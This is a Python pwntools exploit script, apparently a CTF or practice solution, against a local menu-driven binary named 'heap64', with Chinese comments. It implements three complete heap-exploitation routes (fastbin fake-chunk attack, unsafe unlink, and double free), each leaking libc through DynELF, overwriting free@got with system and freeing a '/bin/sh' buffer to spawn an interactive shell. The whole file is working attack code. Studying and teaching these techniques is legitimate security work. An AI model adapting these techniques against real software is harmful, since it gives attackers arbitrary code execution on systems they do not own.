# coding:utf-8
from pwn import *

io = process('./heap64')
e = ELF('./heap64')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

name_addr = 0x06012C0
heaps_addr = 0x06013C0 

def new_heap(index,size):
	io.recvuntil('input:\n')
	io.sendline('1')
	io.recvuntil('index:\n')
	io.sendline(str(index))
	io.recvuntil('size:\n')
	io.sendline(str(size))

def edit_heap(index,content):
	io.recvuntil('input:\n')
	io.sendline('2')
	io.recvuntil('index:\n')
	io.sendline(str(index))
	io.recvuntil('size:\n')
	io.sendline(str(len(content)))
	io.recvuntil('content:\n')
	io.sendline(content)

def print_heap(index, size):
	io.recvuntil('input:\n')
	io.sendline('3')	
	io.recvuntil('index:\n')
	io.sendline(str(index))
	io.recvuntil('size:\n')
	io.sendline(str(size))
	return io.recv(size)

def free_heap(index):
	io.recvuntil('input:\n')
	io.sendline('4')	
	io.recvuntil('index:\n')
	io.sendline(str(index))

def input_name(name):
	io.recvuntil('input:\n')
	io.sendline('5')	
	io.recvuntil('name:\n')
	io.sendline(name)


def pwn_fast_bin():
	#context.log_level = 'debug'

	size = 0x10 # 0x10 0x20 ... 0x70
	real_size = size + 0x10
	# 申请堆0 和堆1
	new_heap(0,size)
	new_heap(1,size)
	# 放入fastbin
	free_heap(1)

	# 构造fake trunk
	# 必须保证 real_size与fastbin中其他相同，否则会报错
	input_name('B'*0xd0 + p64(0) + p64(real_size))  
	fake_chunk_addr = name_addr + 0xd0 

	# 溢出堆0 修改堆1的块头
	payload = 'A'* size + p64(0x0) +  p64(real_size)+ p64(fake_chunk_addr)
	edit_heap(0, payload)

	# 申请一块同样大小的堆，将取出原有的堆1的块
	new_heap(1,size)
	# 此时将申请到fake_chunk_addr指向的块
	new_heap(2,size)

	# 修改堆2内容控制堆0指针，实现任意读写
	# 使堆0指向free@got
	def leak(addr):
		edit_heap(2, 'C'*0x20 + p64(addr))
		buf = print_heap(0,8)
		log.info('%#x -> %s'%(addr, buf))
		return buf

	d = DynELF(leak, elf=e)
	system_addr = d.lookup('system', 'libc')

	edit_heap(2,'C'*0x20 + p64(e.got['free']))

	#buf = print_heap(0,8)
	#free_addr = u64(buf)
	#log.info('free:%#x' % free_addr)

	#libcbase = free_addr - libc.symbols['free']
	#system_addr = libcbase + libc.symbols['system']
	log.info('system: %#x' % system_addr)

	edit_heap(0, p64(system_addr))
	edit_heap(2, '/bin/sh\x00')

	free_heap(2)

	#gdb.attach(io)
	io.interactive()

def pwn_unlink():

	size = 0x100 
	real_size = size + 0x10

	new_heap(3, size)
	new_heap(0, size)

	# ptr是堆3的指针
	ptr = heaps_addr + 0x18
	fk = ptr - 0x18
	bk = ptr - 0x10
	# make *ptr = heaps_addr 

	# 填充堆3的内容如下，伪造大小为0x100（含堆头）的堆块，并设置fk,bk
	payload = p64(0) + p64(size|0x1) + p64(fk) + p64(bk)
	payload = payload.ljust(size, 'A')
	# 溢出堆3 覆盖堆0，使real_size的最后一bit为0，即让libc认为前一块堆空闲
	payload += p64(size) + p64(real_size)
	edit_heap(3, payload)


	# 触发unlink
	free_heap(0)
	# 此时堆3的指针指向heaps_addr
	def leak(addr):
		edit_heap(3, p64(addr))
		buf = print_heap(0,8)
		log.info('%#x -> %s'%(addr, buf))
		return buf

	d = DynELF(leak, elf=e)
	system_addr = d.lookup('system', 'libc')
	log.info('system_addr:%#x'% system_addr)

	#gdb.attach(io)
	# 修改free@got为system
	edit_heap(3, p64(e.got['free']))
	edit_heap(0, p64(system_addr))

	# 调用system("/bin/sh")
	edit_heap(3, '/bin/sh\x00')
	free_heap(3)

	io.interactive()

def pwn_double_free():

	size = 0x100 
	real_size = size + 0x10
	new_heap(0, size)
	new_heap(1, size)
	free_heap(0)
	free_heap(1)

	# 申请回堆0和堆1
	new_heap(3, size+real_size)

	# ptr是堆3的指针
	ptr = heaps_addr + 0x18
	fk = ptr - 0x18
	bk = ptr - 0x10
	# make *ptr = heaps_addr 

	# 伪造堆头，设置fk,bk
	payload = p64(0) + p64(size|0x1) + p64(fk) + p64(bk)
	payload = payload.ljust(size, 'A') 
	# 伪造接下来的堆头，标识前块空闲
	payload += p64(size) + p64(real_size)

	# 填充堆3内容
	edit_heap(3,payload)

	# double free 堆1，根据伪造堆头触发unlink
	free_heap(1)
	# 此后堆3指针指向堆0

	def leak(addr):
		edit_heap(3, p64(addr))
		buf = print_heap(0,8)
		log.info('%#x -> %s'%(addr, buf))
		return buf

	d = DynELF(leak, elf=e)
	system_addr = d.lookup('system', 'libc')
	log.info('system_addr:%#x'% system_addr)

	#gdb.attach(io)
	# 修改free@got为system
	edit_heap(3, p64(e.got['free']))
	edit_heap(0, p64(system_addr))

	# 调用system("/bin/sh")
	edit_heap(3, '/bin/sh\x00')
	free_heap(3)

	io.interactive()


#pwn_fast_bin()
#pwn_unlink()
pwn_double_free()